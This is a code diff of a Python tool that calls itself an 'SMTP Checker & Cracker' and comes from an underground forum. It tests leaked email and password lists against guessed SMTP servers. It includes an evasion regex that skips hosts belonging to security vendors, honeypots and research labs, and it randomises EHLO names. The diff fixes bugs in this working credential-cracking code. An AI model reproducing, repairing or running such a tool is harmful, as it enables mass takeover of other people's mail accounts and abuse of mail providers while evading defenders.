@@ -27,7 +27,7 @@ thread_counter_lock = threading.Lock()
 # mail providers where SMTP access is disabled by default
 bad_mail_servers = 'bk.ru,qq.com'
 
-# fixed dns list (removed double comma)
+# fixed dns list - removed double comma
 custom_dns_nameservers = '1.1.1.2,1.0.0.2,208.67.222.222,208.67.220.220,1.1.1.1,1.0.0.1,8.8.8.8,8.8.4.4,9.9.9.9,149.112.112.112,185.228.168.9,185.228.169.9,76.76.19.19,76.223.122.150,94.140.14.14,94.140.15.15,84.200.69.80,84.200.70.40,8.26.56.26,8.20.247.20,205.171.3.65,205.171.2.65,195.46.39.39,195.46.39.40,159.89.120.99,134.195.4.2,216.146.35.35,216.146.36.36,45.33.97.5,37.235.1.177,77.88.8.8,77.88.8.1,91.239.100.100,89.233.43.71,80.80.80.80,80.80.81.81,74.82.42.42,64.6.64.6,64.6.65.6,45.77.165.194,45.32.36.36'.split(',')
 
 # more dns servers url
@@ -36,8 +36,11 @@ dns_list_url = 'https://public-dns.info/nameservers.txt'
 # expanded lists of SMTP endpoints
 autoconfig_data_url = 'https://raw.githubusercontent.com/solesfiwayne/tools/refs/heads/main/autoconfigs_enriched.txt'
 
-# fixed dangerous domains regex (escaped dots)
-dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mx1.ik2|mx37\.m\.\.p\.com|mxcomet|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'
+# dangerous mx domains - FIXED: escaped dots properly
+dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mx1.ik2|mxcomet|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'
+
+# FIXED: Added missing initialization
+dangerous_regex = None
 
 b   = '\033[1m'
 z   = '\033[0m'
@@ -49,7 +52,7 @@ wrn = b+'[\033[33m!\033[37m] '+z
 inf = b+'[\033[34mi\033[37m] '+z
 npt = b+'[\033[37m?\033[37m] '+z
 
-# EHLO base names
+# EHLO base names (random generated per use)
 EHLO_NAMES_BASE = [
     'mail-{rand}.local',
     'client-{uuid}.example.com',
@@ -79,7 +82,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v54.12.55{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v55.12.15{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
@@ -191,8 +194,6 @@ def read(path):
 def read_lines(path):
     return read(path).splitlines()
 
-# Удаляем is_listening() - не нужна
-
 def get_rand_ip_of_host(host, attempt=0):
     global resolver_obj
     if attempt > 10:
@@ -202,7 +203,7 @@ def get_rand_ip_of_host(host, attempt=0):
             host = cached_dns_resolve(host, 'cname')[0].target
         except:
             pass
-        # Исправленная IPv6 логика
+        # Исправлено: правильная логика выбора IPv6/IPv4
         use_ipv6 = bool(socket.has_ipv6 and socket.has_ipv6 != '-' and socket.has_ipv6 != False)
         try:
             ip_array = cached_dns_resolve(host, 'aaaa' if use_ipv6 else 'a')
@@ -218,8 +219,6 @@ def get_rand_ip_of_host(host, attempt=0):
             return get_rand_ip_of_host(host, attempt+1)
         raise Exception('No A/AAAA record found for '+host+' ('+str(e).lower()+')')
 
-# Удаляем get_alive_neighbor() - не нужна
-
 def guess_smtp_server(domain):
     global default_login_template, resolver_obj, domain_configs_cache, dangerous_regex
     domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
@@ -228,7 +227,8 @@ def guess_smtp_server(domain):
         mx_records = list(resolver_obj.resolve(domain, 'mx'))
         for mx in mx_records:
             mx_candidate = str(mx.exchange).rstrip('.')
-            is_dangerous = (dangerous_regex and dangerous_regex.search(mx_candidate))
+            # FIXED: Check if dangerous_regex is not None
+            is_dangerous = (dangerous_regex is not None and dangerous_regex.search(mx_candidate))
             is_outlook = re.search(r'\.outlook\.com$', mx_candidate)
             if not (is_dangerous and not is_outlook):
                 domains_arr.append(mx_candidate)
@@ -251,7 +251,7 @@ def guess_smtp_server(domain):
             continue
         for port in [2525, 587, 465, 25]:
             debug(f'trying {host}, {ip}:{port}')
-            # Быстрая попытка подключения вместо is_listening
+            # Быстрая проверка без is_listening
             try:
                 socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
                 s = socket.socket(socket_type, socket.SOCK_STREAM)
@@ -302,7 +302,7 @@ def find_email_password_collumnes(list_filename):
 
 def wc_count(filename):
     try:
-        with open(filename, 'rb') as file_handle:  # Исправлено: теперь закрывается
+        with open(filename, 'rb') as file_handle:
             lines = 0
             while True:
                 buf = file_handle.read(1024*1024)
@@ -339,7 +339,6 @@ def socket_get_free_smtp_server(smtp_server, port):
             s = context.wrap_socket(s, server_hostname=smtp_server_ip)
         s.connect((smtp_server_ip, port))
     except Exception as e:
-        # Удалена логика get_alive_neighbor - просто raise
         raise Exception(e)
     return s
 
@@ -367,21 +366,6 @@ def socket_try_login(sock, self_host, smtp_login, smtp_password):
             answer = socket_send_and_read(sock, 'AUTH PLAIN '+smtp_login_pass_b64)
         if answer[:3] == '235' and 'succ' in answer.lower():
             return sock
-    raise Exception(answer)
-
-def socket_try_mail(sock, smtp_from, smtp_to, data):
-    answer = socket_send_and_read(sock, f'MAIL FROM: <{smtp_from}>')
-    if answer[:3] == '250':
-        answer = socket_send_and_read(sock, f'RCPT TO: <{smtp_to}>')
-        if answer[:3] == '250':
-            answer = socket_send_and_read(sock, 'DATA')
-            if answer[:3] == '354':
-                answer = socket_send_and_read(sock, data)
-                if answer[:3] == '250':
-                    socket_send_and_read(sock, 'QUIT')
-                    sock.close()
-                    return True
-    sock.close()
     raise Exception(answer)
 
 def smtp_connect_with_retry(smtp_server, port, login_template, smtp_user, password, max_retries=2):
@@ -467,7 +451,6 @@ def worker_item(jobs_que, results_que):
             except Exception as e:
                 results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+', '.join(str(e).splitlines()).strip()))
             
-            # Удален human_like_delay() вызов
             loop_times.append(time.perf_counter() - time_start)
             while len(loop_times) > min_threads:
                 loop_times.pop(0)
